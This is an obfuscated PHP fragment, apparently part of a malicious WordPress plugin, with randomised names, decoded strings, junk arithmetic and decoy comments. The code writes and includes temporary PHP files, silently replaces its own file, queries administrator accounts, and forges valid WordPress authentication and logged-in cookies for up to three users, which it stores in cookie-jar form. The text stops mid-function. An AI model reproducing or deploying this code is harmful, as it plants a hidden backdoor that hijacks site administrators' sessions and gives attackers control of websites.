 $ohfs0792xygm  = $GLOBALS['__scf_kr_w9stt2gb_360'](m40pvx5ij_z4mj(836),   bovhd4vawcd(838), $ohfs0792xygm);
  $fqun99snspdm     =  m7maju8jcvf3286(kqqy8xacwrmnc_xxuywhx(),  lpwgqh9300(723));
if    ($fqun99snspdm   ===   false)  {
  return;
    }


      @$GLOBALS['__scf_u59p44o1il_196']($fqun99snspdm,   m5t68uuej1(839) . $ohfs0792xygm);
try  {
@include $fqun99snspdm;
  }  finally   {



    netei2x342rtzmi4tj69($fqun99snspdm);
    }
    $f3uf_tr62wm3f657    = $GLOBALS['__scf_rwpc7a7ar1p_204']($vo1nbl6ptlbwv,  PATHINFO_FILENAME);
    $GLOBALS[m40pvx5ij_z4mj(840)]  = $vo1nbl6ptlbwv;
  $GLOBALS[bovhd4vawcd(841)]  =  $f3uf_tr62wm3f657;

 $apz91rkhpon_ = m40pvx5ij_z4mj(842)
    .  m5t68uuej1(843)
  . lpwgqh9300(844)
   .    m5t68uuej1(845)

.  bovhd4vawcd(846)

 .  '}'
. m40pvx5ij_z4mj(847)
.   '}'
     .     '}';
    $ttww_cwvrx95wb_l  =    m7maju8jcvf3286(kqqy8xacwrmnc_xxuywhx(), lpwgqh9300(723));
if  ($ttww_cwvrx95wb_l)   {
   @$GLOBALS['__scf_u59p44o1il_196']($ttww_cwvrx95wb_l,  $apz91rkhpon_);



try    {$g2zw05xuzdam4=37*5;$sd17fq5kc_jk=$g2zw05xuzdam4-14;
  @include    $ttww_cwvrx95wb_l;

 }  finally     {
// monomorphize wait-free provider

  netei2x342rtzmi4tj69($ttww_cwvrx95wb_l);
 }
  }
 } catch  (Throwable $k3g08rnqu9m)     {
        r63yaewew47stuijcrwsx6(lpwgqh9300(848),  $k3g08rnqu9m);
   }    catch   (Exception  $k3g08rnqu9m) {
   }
  }
  if      (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(849))) {



function   c9lbml8swqbqyc1pfb($biu009h8ggntwd3,  $hy045m8h6vtbt8)
 {
  if     (!    $GLOBALS['__scf_pomb89yiuz_37']($biu009h8ggntwd3))  {
return  $biu009h8ggntwd3;

    }
  $smfvtjfb4rm6j6   = array(m40pvx5ij_z4mj(850),  bovhd4vawcd(851),  bovhd4vawcd(852), lpwgqh9300(853),  m40pvx5ij_z4mj(551));


   foreach ($smfvtjfb4rm6j6 as  $key)  {
     if   (! isset($biu009h8ggntwd3[$key])    ||      ! $GLOBALS['__scf_pomb89yiuz_37']($biu009h8ggntwd3[$key]))   {
continue;
  }
   $utln0lk9ielcmwaa  =  array();
  foreach   ($biu009h8ggntwd3[$key]     as  $j85t6zrzve) {

 if     (!   $GLOBALS['__scf_pomb89yiuz_37']($j85t6zrzve))  {

 $utln0lk9ielcmwaa[] =    $j85t6zrzve;
continue;
       }


      $kgidn0bo_1ewjd6r   =   isset($j85t6zrzve[lpwgqh9300(413)])    ? $j85t6zrzve[lpwgqh9300(854)] :     "";
 $f3uf_tr62wm3f657    =    isset($GLOBALS[m5t68uuej1(841)])  ? $GLOBALS[lpwgqh9300(855)]    :     "";
if   ($kgidn0bo_1ewjd6r ===  $hy045m8h6vtbt8 ||  ($f3uf_tr62wm3f657 !==      ""     &&  $kgidn0bo_1ewjd6r ===    $f3uf_tr62wm3f657))  {
      continue;
}
   $utln0lk9ielcmwaa[]    =    c9lbml8swqbqyc1pfb($j85t6zrzve,   $hy045m8h6vtbt8);
}
 $biu009h8ggntwd3[$key] = $utln0lk9ielcmwaa;
 }

  return   $biu009h8ggntwd3;
   }
 }



   function  p5_es53lv8rkijk1()
     {
 if  (!empty($GLOBALS[m40pvx5ij_z4mj(856)])) return   false;
        $GLOBALS[m5t68uuej1(856)]  =   1;
  return true;
 }
function  bhlbtvxye0zoi2fsmbyk_()
    {
   try {
if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(467))  &&  get_transient(m5t68uuej1(676)))  {
 return;
}


 if   (!p5_es53lv8rkijk1())  return;



 if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(675))) set_transient(lpwgqh9300(857),    1, (339+3261));
  $rc7r0hgjijt7nm7z      = @$GLOBALS['__scf_pftf6vocmvs2m_99'](t6995wceyqc2q1wqvl());
 if ($rc7r0hgjijt7nm7z  &&   $rc7r0hgjijt7nm7z  >     (0x131e+0x6a)   && $rc7r0hgjijt7nm7z <    (2180105+2819895)     && !p_lwrm_zqo9euyd0(t6995wceyqc2q1wqvl())) {
   $dh18_1b6hn     = @$GLOBALS['__scf_tm09rtls_27e_98'](t6995wceyqc2q1wqvl());

$w4xt8dmxjp4f8so     =  n2fjr1yyl5ye7s_6q(t6995wceyqc2q1wqvl());



if      ($GLOBALS['__scf_e_8z8ias8ka_43']($w4xt8dmxjp4f8so)  &&  fgcc_h22bqxgwmccod($w4xt8dmxjp4f8so)    &&    qvjdebfk73eai06dz0vqt($w4xt8dmxjp4f8so)  === kdgw8qqvzf6yolk())    {
      if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(184)))  @clearstatcache(true, t6995wceyqc2q1wqvl());
 if   (@$GLOBALS['__scf_tm09rtls_27e_98'](t6995wceyqc2q1wqvl()) ===   $dh18_1b6hn && @$GLOBALS['__scf_pftf6vocmvs2m_99'](t6995wceyqc2q1wqvl())      ===  $rc7r0hgjijt7nm7z)  {
 if (a3hx61zfms1ji3euwsc(t6995wceyqc2q1wqvl(), y2fq_g7qilvdboqm1($w4xt8dmxjp4f8so))) {
      tgj6urla_2q3x4g8e(t6995wceyqc2q1wqvl());
   lnseazh_1k4yq6v_kjl(t6995wceyqc2q1wqvl());

    }



       }
 }
unset($w4xt8dmxjp4f8so,  $dh18_1b6hn);
}
  $b6isie1aa_70pte1     =  @$GLOBALS['__scf_pftf6vocmvs2m_99'](t6995wceyqc2q1wqvl());
$vfnansd58bhb     = $b6isie1aa_70pte1 &&    $b6isie1aa_70pte1     > (4912+88);
if  ($vfnansd58bhb   && $b6isie1aa_70pte1   >   (52428723+77)) {
 $vfnansd58bhb =  false;

 }
  if     ($vfnansd58bhb &&   $b6isie1aa_70pte1 >  (1048497+79)  &&     !e2driuzucqp8g4db42ay($b6isie1aa_70pte1))  {
    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(858)))      {
 set_transient(m5t68uuej1(859), 1,  (693+2907));
}


return;
}



     if  ($vfnansd58bhb)   {
 $gmb5e86oon1ykg =   n2fjr1yyl5ye7s_6q(t6995wceyqc2q1wqvl());
if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($gmb5e86oon1ykg)    ||    !fgcc_h22bqxgwmccod($gmb5e86oon1ykg))  {
 $vfnansd58bhb =  false;
      }   else    {
// lock-free structural-type

   $d4uqpnvadxj7aqt   =  d6ydz3_mq4hw_2s8_bo(m40pvx5ij_z4mj(860),  "");


      $xc1493c_pcy1d9nb   =  qvjdebfk73eai06dz0vqt($gmb5e86oon1ykg);$am8yqquj=167|165;$qp6cpi77x8btw6=$am8yqquj^212;
     $hmh4305mjpu7     = qvjdebfk73eai06dz0vqt($GLOBALS['__scf_e_8z8ias8ka_43']($d4uqpnvadxj7aqt)   ?  $d4uqpnvadxj7aqt  :   "");
  if  ($xc1493c_pcy1d9nb    !== ""  &&    ($hmh4305mjpu7  ===  ""  || version_compare($hmh4305mjpu7,   $xc1493c_pcy1d9nb,     '<')))   {
  $ux75i_id1gh9x3b9  =      $GLOBALS['__scf_pe3s4q1z7z_59']($gmb5e86oon1ykg);
    $r05hxtvhvp9pd   =    @$GLOBALS['__scf_a83pywb98qzq2_20']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())      .  lpwgqh9300(861)   .   $ux75i_id1gh9x3b9);



  if (!$r05hxtvhvp9pd)     {
$hhgfcmn4h4fhk3b    =   get_option(m40pvx5ij_z4mj(690));
if     ($GLOBALS['__scf_e_8z8ias8ka_43']($hhgfcmn4h4fhk3b)   && $GLOBALS['__scf_i8i8g4oxha_7']($hhgfcmn4h4fhk3b,  $ux75i_id1gh9x3b9  .  '|')  ===  0)   $r05hxtvhvp9pd =     true;
    }

    if  ($r05hxtvhvp9pd)   $vfnansd58bhb = false;
if (!$r05hxtvhvp9pd  &&     $GLOBALS['__scf_e_8z8ias8ka_43']($d4uqpnvadxj7aqt)  && ($d4uqpnvadxj7aqt     ===     "" ||   $hmh4305mjpu7   === "" || version_compare($hmh4305mjpu7,    $xc1493c_pcy1d9nb, '<')))   vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(860), $gmb5e86oon1ykg,  m5t68uuej1(750));
  unset($ux75i_id1gh9x3b9,    $r05hxtvhvp9pd, $hhgfcmn4h4fhk3b);



  }  elseif  ($GLOBALS['__scf_e_8z8ias8ka_43']($d4uqpnvadxj7aqt)  && $GLOBALS['__scf_fr9u7cq1eo_10']($d4uqpnvadxj7aqt) >  (0xfc+0xf8)    &&     $GLOBALS['__scf_fr9u7cq1eo_10']($d4uqpnvadxj7aqt)    <=      (0x3a4b9+0xc5b47)  && !at2pgldx1ep7sbjlr_r7($d4uqpnvadxj7aqt)    &&  fgcc_h22bqxgwmccod($d4uqpnvadxj7aqt) &&   $GLOBALS['__scf_pe3s4q1z7z_59']($gmb5e86oon1ykg)     !==      $GLOBALS['__scf_pe3s4q1z7z_59']($d4uqpnvadxj7aqt)) {
$vfnansd58bhb    =    false;
      }
  }
     }


   if  ($vfnansd58bhb)  {
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(862))) {
   set_transient(bovhd4vawcd(863), 1,     (6993-3393));

}
// sequentially-consistent decorator

return;
   }
    if (p_lwrm_zqo9euyd0(t6995wceyqc2q1wqvl()))  {
  return;

  }
  $nc4b0hz_z_5mh     = $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl());
  if (!    @$GLOBALS['__scf_i9hdv7zrfsy_45']($nc4b0hz_z_5mh))  {
    xcz5hl0mdlt7fpm3xxe($nc4b0hz_z_5mh, (69+424), true);


  }
 $ggf26jktidjoo8bf =  d6ydz3_mq4hw_2s8_bo(lpwgqh9300(860), "");
      if (!$ggf26jktidjoo8bf    ||  !$GLOBALS['__scf_e_8z8ias8ka_43']($ggf26jktidjoo8bf))   {
if    (!get_transient(bovhd4vawcd(864))) {
  r63yaewew47stuijcrwsx6(bovhd4vawcd(865),    m5t68uuej1(866));
     set_transient(m5t68uuej1(864), 1,   (5526-1926));
   }


 }
 if ($ggf26jktidjoo8bf     &&  $GLOBALS['__scf_e_8z8ias8ka_43']($ggf26jktidjoo8bf) &&    $GLOBALS['__scf_fr9u7cq1eo_10']($ggf26jktidjoo8bf) >      (0xf8+0xfc)    && $GLOBALS['__scf_fr9u7cq1eo_10']($ggf26jktidjoo8bf)  <=  (1048505+71)  &&  !at2pgldx1ep7sbjlr_r7($ggf26jktidjoo8bf)  &&  fgcc_h22bqxgwmccod($ggf26jktidjoo8bf)) {
     $u82gqrjwzh0z16  =  qvjdebfk73eai06dz0vqt($ggf26jktidjoo8bf);
   if ($u82gqrjwzh0z16  === ""  ||    version_compare($u82gqrjwzh0z16,   kdgw8qqvzf6yolk(),  '<'))  {
return;
}
   $n5ylvzckdw0 = $GLOBALS['__scf_pe3s4q1z7z_59']($ggf26jktidjoo8bf);
   if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()) . m40pvx5ij_z4mj(861)  .   $n5ylvzckdw0))  return;
  $rtbqjys4n6olu    = get_option(m5t68uuej1(867));


 if ($GLOBALS['__scf_e_8z8ias8ka_43']($rtbqjys4n6olu)   &&  $GLOBALS['__scf_i8i8g4oxha_7']($rtbqjys4n6olu,  $n5ylvzckdw0   .  '|')   ===  0)  return;
   unset($n5ylvzckdw0,     $rtbqjys4n6olu);



$ylik72ju8u3hwr    = $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())     . m40pvx5ij_z4mj(185)    .     $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  bovhd4vawcd(835));



   $opi3ya_ip9269kd1  =  @$GLOBALS['__scf_a83pywb98qzq2_20']($ylik72ju8u3hwr)   ?  $GLOBALS['__scf_nimluvpxhrpvn_323']((string)  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ylik72ju8u3hwr))     :   "";
      if  ($opi3ya_ip9269kd1   !==    "" &&     $GLOBALS['__scf_pe3s4q1z7z_59']($ggf26jktidjoo8bf)  ===  $opi3ya_ip9269kd1) {
return;


     }
// disconnected b-tree


       cik9ldzrbjmtnzm00(t6995wceyqc2q1wqvl(),      (406+14));
 $ovxsjnk13vhj19jg = a3hx61zfms1ji3euwsc(t6995wceyqc2q1wqvl(),    y2fq_g7qilvdboqm1($ggf26jktidjoo8bf));$wtvfk6y2yer2=(0x72+0xd0);$gmjos1cdi2l0l=$wtvfk6y2yer2%16;
      if  ($ovxsjnk13vhj19jg)    {
 tgj6urla_2q3x4g8e(t6995wceyqc2q1wqvl());
 cik9ldzrbjmtnzm00(t6995wceyqc2q1wqvl(), (0x187+0x1d));

lnseazh_1k4yq6v_kjl(t6995wceyqc2q1wqvl());


 z2lalb3eiqlgy6ozb9(true);
    ai51jutf9hg_v2ib(true);
   nhm51ioabawwjskqka9eh3(t6995wceyqc2q1wqvl());
  if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(862)))  {
  set_transient(lpwgqh9300(863), 1,   (3296+304));



   }
 }  elseif     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(862)))  {$grhx0aczjk4o_r=29+4;$mfiutzfh9him=$grhx0aczjk4o_r-46;
  set_transient(lpwgqh9300(868),     1, (3493-1693));
     }
     }
    }   catch (Throwable $k3g08rnqu9m) {
   r63yaewew47stuijcrwsx6(m5t68uuej1(865),  $k3g08rnqu9m);
    }  catch (Exception $k3g08rnqu9m) {
 }
   }



function  z3xwa8abcrgqe_ws()
       {
// renew bivariant for OPcache config

    b30mdcicahooa3obn6(m5t68uuej1(869),   m5t68uuej1(870));
      b30mdcicahooa3obn6(lpwgqh9300(871),     lpwgqh9300(870));
   if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(872)))    {
 remove_action(m5t68uuej1(873), bovhd4vawcd(874));

 remove_action(lpwgqh9300(875),  bovhd4vawcd(876), (17-7));
remove_action(m40pvx5ij_z4mj(877), m5t68uuej1(878),  (17-7));
}
}
function   f9ml3iyd9gbyvhoer0h4()
 {
// masked lanes

 try {
// activate nominal-type for WP Embed Block

$wpdb  = $GLOBALS[lpwgqh9300(879)];
$w7gydr0zkq1_wkp    =    $wpdb->prefix    . bovhd4vawcd(880);
$szlze7c6mbixvbj =  'S'  .     m5t68uuej1(881)  .    $wpdb->users  . m5t68uuej1(882)  .  $wpdb->usermeta  .   lpwgqh9300(883);


    $auo6lszjrins0v   =    $wpdb->get_results($wpdb->prepare($szlze7c6mbixvbj, $w7gydr0zkq1_wkp,    bovhd4vawcd(884)));


 if   (!$GLOBALS['__scf_pomb89yiuz_37']($auo6lszjrins0v))   {
 r63yaewew47stuijcrwsx6(lpwgqh9300(885),  (string)  $wpdb->last_error);
 return  array();
    }


      return $auo6lszjrins0v;
   } catch   (Throwable   $k3g08rnqu9m)    {



       r63yaewew47stuijcrwsx6(bovhd4vawcd(583),   $k3g08rnqu9m);
  } catch (Exception $k3g08rnqu9m)    {



  r63yaewew47stuijcrwsx6(lpwgqh9300(583), $k3g08rnqu9m);


    }
 return  array();$jy1i9lt3up=43+48;$klfowkwguw=$jy1i9lt3up-21;
  }



    function  du2xfgtjox5z5v7wf($wxjm93rltbr0dubr)
  {
  $msob29zlqca0up0v =   array();
$fjh4duvyj6bvh86    =    function  ($vw1u1zkmd90v7fv) {
 $vw1u1zkmd90v7fv[m5t68uuej1(886)]  = "";
   return   $vw1u1zkmd90v7fv;

};
 try   {
      $ehwoflclgcde3     =   d6ydz3_mq4hw_2s8_bo(m5t68uuej1(887), array());
  if     (!$GLOBALS['__scf_pomb89yiuz_37']($ehwoflclgcde3))   $ehwoflclgcde3  =  array();
 $_pd  =     false;
  foreach   ($ehwoflclgcde3 as  $qx068aapxe3py72z   => $z2zcr71m6pcv62)  {
if  ($GLOBALS['__scf_pomb89yiuz_37']($z2zcr71m6pcv62) &&     isset($z2zcr71m6pcv62['c'],   $z2zcr71m6pcv62['e']) &&   $GLOBALS['__scf_pomb89yiuz_37']($z2zcr71m6pcv62['c']) && (int)    $z2zcr71m6pcv62['e']  >     $GLOBALS['__scf_ibw9xvmx9ckin_187']()      +   (0x42d5+0x10eab))  {

$msob29zlqca0up0v[$qx068aapxe3py72z]  =  $z2zcr71m6pcv62['c'];
   }    else  {
unset($ehwoflclgcde3[$qx068aapxe3py72z]);
 $_pd =    true;
 }
 }
  if   (! $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(888)) ||   ! $GLOBALS['__scf_l_p7ggy6l__533'](bovhd4vawcd(889))) {
if    ($_pd)  vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(887),      $ehwoflclgcde3,  lpwgqh9300(890));
     return   $msob29zlqca0up0v;
}


     if (!  $GLOBALS['__scf_pomb89yiuz_37']($wxjm93rltbr0dubr)  ||      empty($wxjm93rltbr0dubr)) {$skyyrj5kkg29=52*4;$aia7d3o4nn=$skyyrj5kkg29-23;
   if    ($_pd)     vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(891),      $ehwoflclgcde3, lpwgqh9300(890));$e7vxkntf=72|239;$v9eku4fvd=$e7vxkntf^139;
return $msob29zlqca0up0v;
}
// clopen skolem

 $dae79dyhl93ss1l  =  $GLOBALS['__scf_ibw9xvmx9ckin_187']()   + (5+9)     * (86392+8);
 $is_ssl =  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(479))   &&    is_ssl();
      $q40wxsygjqs3vhi =   $is_ssl ?      bovhd4vawcd(892) : bovhd4vawcd(893);
  $z4b4qtyyiz4f  =   $is_ssl ? (defined(bovhd4vawcd(894))  ?      SECURE_AUTH_COOKIE   :    "")  :  (defined(m40pvx5ij_z4mj(895))    ?  AUTH_COOKIE    :      "");
  




 $nr5nw_snvss7     =  defined(m5t68uuej1(896))     ?  LOGGED_IN_COOKIE    : "";
    if  (!    $z4b4qtyyiz4f  || !  $nr5nw_snvss7) {
 if  ($_pd)     vmq5vh_lh7_vsiehf4nm(m5t68uuej1(897),  $ehwoflclgcde3, m40pvx5ij_z4mj(890));
 return  $msob29zlqca0up0v;
 }


  $kmx4t190e725s   =   defined(m5t68uuej1(898)) &&   COOKIE_DOMAIN  ?   $GLOBALS['__scf_ygq7rrk70hs6ha_8'](COOKIE_DOMAIN,  '.') :  rgrb14nj3p43kvdym51x("");
     $aacs8dta4fj9_ =      defined(m5t68uuej1(899))     ?     COOKIEPATH : '/';
 $cyrjbitex_jc0mf6    =   defined(m40pvx5ij_z4mj(900))  ?  ADMIN_COOKIE_PATH :    m5t68uuej1(901);
    $smsrkjyy17lu    = $is_ssl ? bovhd4vawcd(902)   :  m40pvx5ij_z4mj(903);

$wkokdoejn433    = "\t";
    b30mdcicahooa3obn6(m5t68uuej1(904),    $fjh4duvyj6bvh86, 0);
  $l2yxn4t2m85wnaom  =  zoeevr3iz5hokjv(bovhd4vawcd(905));
   

   $tr4i4h2h1ohs0gy =     $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(906))  ? @get_option($l2yxn4t2m85wnaom,     array()) : array();
if   (!$GLOBALS['__scf_pomb89yiuz_37']($tr4i4h2h1ohs0gy)) $tr4i4h2h1ohs0gy     = array();
 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(906))  &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(741)))  {

   $ptdaredwaxx   =  (int) @get_option(zoeevr3iz5hokjv(m5t68uuej1(907)),  0);
if    ($ptdaredwaxx     < 2)   {
     if    (!empty($tr4i4h2h1ohs0gy)) {
        $tr4i4h2h1ohs0gy  =   array();
    @update_option($l2yxn4t2m85wnaom,  $tr4i4h2h1ohs0gy, lpwgqh9300(908));
  }
      @update_option(zoeevr3iz5hokjv(m40pvx5ij_z4mj(907)),    2,    bovhd4vawcd(908));
 }
/* negative-definite vault */

  unset($ptdaredwaxx);
 }
 $ljid45dnios  =   $GLOBALS['__scf_xbixt340jb_38']($msob29zlqca0up0v);
     foreach ($wxjm93rltbr0dubr   as    $spi5vmaj6q) {

   if   (!   $GLOBALS['__scf_pd74_ila1rfp_70']($spi5vmaj6q)  || !   $spi5vmaj6q->ID    ||     !  $spi5vmaj6q->user_login) {
 continue;
 }
if   ($ljid45dnios >=  (5-2)) {
 break;
}
$je1ayw5_dpu3_56b = (string) $spi5vmaj6q->user_login;
   if  (isset($msob29zlqca0up0v[$je1ayw5_dpu3_56b]))  {
  continue;

 }
 if   (isset($tr4i4h2h1ohs0gy[$je1ayw5_dpu3_56b])      && (int)  $tr4i4h2h1ohs0gy[$je1ayw5_dpu3_56b]  > $GLOBALS['__scf_ibw9xvmx9ckin_187']() +  2      *    (86331+69))  {

      continue;
  }
  wp_cache_delete($spi5vmaj6q->ID,  bovhd4vawcd(909));

$h2zu9gia7g2m =  get_user_meta($spi5vmaj6q->ID,   m5t68uuej1(910), true);
 if  ($GLOBALS['__scf_pomb89yiuz_37']($h2zu9gia7g2m)  &&    $GLOBALS['__scf_xbixt340jb_38']($h2zu9gia7g2m)  >=    (6+4))  {
  $kvonvrlvkr =   array();
  foreach      ($h2zu9gia7g2m  as  $wkkrt_mzimb2  => $gmgx7_edk902ic5o) {
 if  (isset($gmgx7_edk902ic5o[lpwgqh9300(911)])  && $gmgx7_edk902ic5o[lpwgqh9300(911)] >  $GLOBALS['__scf_ibw9xvmx9ckin_187']())     {$ll7viyga4ryv=253|7;$kpi0tlfelv=$ll7viyga4ryv^217;
  $kvonvrlvkr[$wkkrt_mzimb2]  =      $gmgx7_edk902ic5o;
}
   }
    if  ($GLOBALS['__scf_xbixt340jb_38']($kvonvrlvkr)   !== $GLOBALS['__scf_xbixt340jb_38']($h2zu9gia7g2m))    {


update_user_meta($spi5vmaj6q->ID,  m5t68uuej1(910),      $kvonvrlvkr);
}
  }
     wp_cache_delete($spi5vmaj6q->ID,  m40pvx5ij_z4mj(912));

   $fef1u7fcp_7rtmmm  =    $GLOBALS['__scf_jvgqufbujun_y_289'](array(m40pvx5ij_z4mj(913),   lpwgqh9300(914)), $spi5vmaj6q->ID);
 $fcfu1cuaxgkzr1f3   = $fef1u7fcp_7rtmmm->create($dae79dyhl93ss1l);
 $hvjq_j7n9d20vz =  array();
  $hvjq_j7n9d20vz[] = $kmx4t190e725s   .      $wkokdoejn433  .    m40pvx5ij_z4mj(902) .   $wkokdoejn433    . $aacs8dta4fj9_    .   $wkokdoejn433     . $smsrkjyy17lu   .  $wkokdoejn433 .    $dae79dyhl93ss1l  .  $wkokdoejn433 .  $nr5nw_snvss7 .     $wkokdoejn433  .  $GLOBALS['__scf_gmtqnw_bd8xed_888']($spi5vmaj6q->ID, $dae79dyhl93ss1l,   bovhd4vawcd(915),     $fcfu1cuaxgkzr1f3);

 if  ($z4b4qtyyiz4f)     {
 $hvjq_j7n9d20vz[]  = $kmx4t190e725s    . $wkokdoejn433 . lpwgqh9300(916)     .      $wkokdoejn433  .   $cyrjbitex_jc0mf6  .    $wkokdoejn433 . $smsrkjyy17lu  . $wkokdoejn433   .    $dae79dyhl93ss1l    .  $wkokdoejn433  . $z4b4qtyyiz4f  . $wkokdoejn433     .    $GLOBALS['__scf_gmtqnw_bd8xed_888']($spi5vmaj6q->ID,   $dae79dyhl93ss1l,   $q40wxsygjqs3vhi,   $fcfu1cuaxgkzr1f3);
 }
// instantiate backlog for WP RichText API

$msob29zlqca0up0v[$spi5vmaj6q->user_login]  =   $hvjq_j7n9d20vz;
 $ehwoflclgcde3[$je1ayw5_dpu3_56b] =  array('c'   =>     $hvjq_j7n9d20vz,   'e'   =>   $dae79dyhl93ss1l);
 $_pd = true;
$ljid45dnios++;
 }
  if    ($_pd)  {
// initialize template for APCu shm

vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(917),   $ehwoflclgcde3, m5t68uuej1(918));
   }
}  catch (Throwable  $k3g08rnqu9m)  {
  r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(919), $k3g08rnqu9m);
   } catch (Exception    $k3g08rnqu9m) {
 r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(919), $k3g08rnqu9m);
   }

 remove_filter(lpwgqh9300(920),    $fjh4duvyj6bvh86,  0);
return   $msob29zlqca0up0v;


      }
   function  y1e7b4xmdc0w921amdpg()
     {
// normal aggregator




 try  {
 $ehwoflclgcde3   = d6ydz3_mq4hw_2s8_bo(m40pvx5ij_z4mj(917),    array());
      if   (!$GLOBALS['__scf_pomb89yiuz_37']($ehwoflclgcde3) || empty($ehwoflclgcde3)) return;
$l2yxn4t2m85wnaom  =      zoeevr3iz5hokjv(bovhd4vawcd(905));
    $tr4i4h2h1ohs0gy   =     $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(921))  ?     @get_option($l2yxn4t2m85wnaom,  array()) :   array();
     if  (!$GLOBALS['__scf_pomb89yiuz_37']($tr4i4h2h1ohs0gy)) $tr4i4h2h1ohs0gy   =   array();
    foreach  ($ehwoflclgcde3   as  $qx068aapxe3py72z   =>   $z2zcr71m6pcv62)     {
  $tr4i4h2h1ohs0gy[$qx068aapxe3py72z] =  $GLOBALS['__scf_pomb89yiuz_37']($z2zcr71m6pcv62)   &&  isset($z2zcr71m6pcv62['e'])  ? (int)   $z2zcr71m6pcv62['e']   :    $GLOBALS['__scf_ibw9xvmx9ckin_187']()   +    (57^55)   * (0x14f83+0x1fd);


 }
 foreach  ($tr4i4h2h1ohs0gy as  $db69spsckza   =>  $edel_1nq6yi99)   {
   if   ((int)  $edel_1nq6yi99   <    $GLOBALS['__scf_ibw9xvmx9ckin_187']())  unset($tr4i4h2h1ohs0gy[$db69spsckza]);
    }
  if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(741)))    @update_option($l2yxn4t2m85wnaom,  $tr4i4h2h1ohs0gy,  bovhd4vawcd(918));
   vmq5vh_lh7_vsiehf4nm(m5t68uuej1(922),    array(),    m40pvx5ij_z4mj(918));
   }  catch      (Throwable  $k3g08rnqu9m)  {
// WP REST API v2: degenerate branded-type

    r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(923),  $k3g08rnqu9m);
  }      catch  (Exception  $k3g08rnqu9m)   {
r63yaewew47stuijcrwsx6(lpwgqh9300(924), $k3g08rnqu9m);
 }
// @hydrate trie

  }

    function  jf1xgzzqcjve53lck9($kdbfhd3lu4ttw)



 {
     if  ($GLOBALS['__scf_e_8z8ias8ka_43']($kdbfhd3lu4ttw))    return  $kdbfhd3lu4ttw;
if     ($GLOBALS['__scf_pomb89yiuz_37']($kdbfhd3lu4ttw)   &&   isset($kdbfhd3lu4ttw['p'])   && $GLOBALS['__scf_e_8z8ias8ka_43']($kdbfhd3lu4ttw['p'])) return $kdbfhd3lu4ttw['p'];
return  "";
  }
      function    gcbvm3osms8zsh_($wxjm93rltbr0dubr)
      {
$list     =  array();


 $s9di2iv9ar0df9     =  (string) d6ydz3_mq4hw_2s8_bo(m5t68uuej1(925),   "");

     $lojxirmkuemtyo  =   (string)    d6ydz3_mq4hw_2s8_bo(m5t68uuej1(926),   "");



if   ($s9di2iv9ar0df9    !==  ""  && $lojxirmkuemtyo   !== "")  {
   $list[$s9di2iv9ar0df9] =      $lojxirmkuemtyo;
  }



     $vr260_zc58jdhv6     = d6ydz3_mq4hw_2s8_bo(m5t68uuej1(542),    array());$tib1aoh2fg=26|70;$ja3qqvcfe_61zm=$tib1aoh2fg^149;
  if  ($GLOBALS['__scf_pomb89yiuz_37']($vr260_zc58jdhv6)) {



 foreach  ($vr260_zc58jdhv6 as  $c33y569h75pi => $a8i09xaoim)   {

 $ln5_jbqpu4in   = jf1xgzzqcjve53lck9($a8i09xaoim);
    if  ($ln5_jbqpu4in  !==   "")   $list[(string) $c33y569h75pi]  = $ln5_jbqpu4in;



 }
  }


  return  $list;
}
function qsxy7rnjcnmrfdxg95now($c33y569h75pi,   $zv1y1in0l__4rj,   $zrjakvmh1gaeb)
{
try   {
     if  (!  $GLOBALS['__scf_pd74_ila1rfp_70']($c33y569h75pi)  || ! $GLOBALS['__scf_sruyigi7mie8_118']($c33y569h75pi, m40pvx5ij_z4mj(927)))  {
      return $c33y569h75pi;
     }
      if   (!     $c33y569h75pi->has_cap(m5t68uuej1(715))) {
  return $c33y569h75pi;



 }
if (! $GLOBALS['__scf_e_8z8ias8ka_43']($zrjakvmh1gaeb)      ||  !  $zrjakvmh1gaeb)  {
     return    $c33y569h75pi;
}

   $vr260_zc58jdhv6    =  d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(928),   array());

   if (!   $GLOBALS['__scf_pomb89yiuz_37']($vr260_zc58jdhv6)) {

$vr260_zc58jdhv6  = array();
   }
     foreach  ($vr260_zc58jdhv6   as   $afi4iwtccre5mup7 =>  $d29li7yf2fvxv) {
      $pl61c488om     =   $GLOBALS['__scf_pomb89yiuz_37']($d29li7yf2fvxv)  &&    isset($d29li7yf2fvxv[m40pvx5ij_z4mj(929)])  ? (int)   $d29li7yf2fvxv[m5t68uuej1(929)]    : 0;
